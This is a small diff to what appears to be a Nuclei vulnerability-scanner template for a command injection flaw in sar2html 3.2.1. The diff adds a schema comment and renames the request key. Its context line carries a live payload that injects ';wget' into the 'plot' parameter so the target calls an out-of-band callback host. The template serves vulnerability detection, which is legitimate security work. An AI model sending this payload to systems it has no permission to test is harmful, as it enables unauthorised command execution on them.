@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: sar2html-rce
 info:
   name: sar2html 3.2.1 - Remote Command Injection
@@ -12,7 +13,7 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: sar2html,rce,oast
-requests:
+http:
   - raw:
       - |
         GET /index.php?plot=;wget%20http://{{interactsh-url}} HTTP/1.1
